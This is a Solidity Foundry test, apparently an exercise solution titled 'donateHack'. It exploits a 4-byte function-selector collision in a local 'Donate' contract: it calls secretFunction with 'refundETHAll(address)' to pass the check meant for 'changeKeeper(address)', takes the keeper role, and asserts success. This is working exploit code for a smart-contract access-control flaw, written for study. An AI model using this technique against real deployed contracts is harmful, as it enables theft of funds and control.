// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/Donacion.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testhack() public {
        vm.startPrank(hacker);
        // Hack Time
        // Enviamos un nombre de función que da el mismo selector pero distinto hash que changeKeeper
        //donate.secretFunction("changeKeeper(address)"); //097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428
        donate.secretFunction("refundETHAll(address)");   //097798388c571121532917a27dd5cdfcd5869a22cc0bcc0cdeb883abee704bcb

        assert(donate.keeperCheck());
    }
}